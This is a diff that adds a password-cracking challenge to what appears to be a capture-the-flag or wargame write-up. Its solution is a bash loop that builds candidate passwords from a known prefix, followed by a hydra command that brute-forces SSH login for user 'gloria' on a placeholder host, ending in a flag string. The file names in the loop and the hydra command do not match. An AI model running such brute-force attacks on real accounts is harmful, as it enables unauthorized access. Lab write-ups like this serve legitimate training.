@@ -495,3 +495,13 @@ strings -n 8 <br>
 
 ***h1hnDPHpydEjoEN***
 
+--- 
+
+**35º Chanllenge:**
+***Task:*** <br> 
+## EN ## <br>
+The user gloria has forgotten the last 2 characters of her password ... They only remember that they were 2 lowercase letters.<br>
+**Solution:**  <br>
+ for L1 in {a..z}; do for L2 in {a..z}; do echo "v7xUVE2e5bjUc$L1$L2"; done; done > password_list.txt <br>
+hydra -l gloria -P gloriapass.txt [TARGET_IP_OR_HOSTNAME] ssh -s 5000 -t 4
+***h1hnDPHpydEjoEN***
